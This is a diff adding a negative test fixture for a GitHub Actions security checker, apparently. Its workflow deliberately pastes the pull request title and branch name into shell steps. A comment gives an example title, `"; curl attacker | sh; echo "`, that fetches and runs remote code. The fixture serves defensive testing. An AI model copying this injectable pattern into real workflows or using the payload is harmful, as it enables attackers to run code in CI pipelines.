@@ -1,0 +1,18 @@
+# Negative fixture: attacker-controlled context pasted straight into a shell
+# body. A pull request titled `"; curl attacker | sh; echo "` runs as the
+# workflow. Expected: script-injection x2.
+name: injection
+on: pull_request_target
+
+permissions:
+  contents: read
+
+jobs:
+  greet:
+    runs-on: ubuntu-24.04
+    timeout-minutes: 5
+    steps:
+      - run: echo "reviewing ${{ github.event.pull_request.title }}"
+      - run: |
+          git checkout "${{ github.head_ref }}"
+          make check
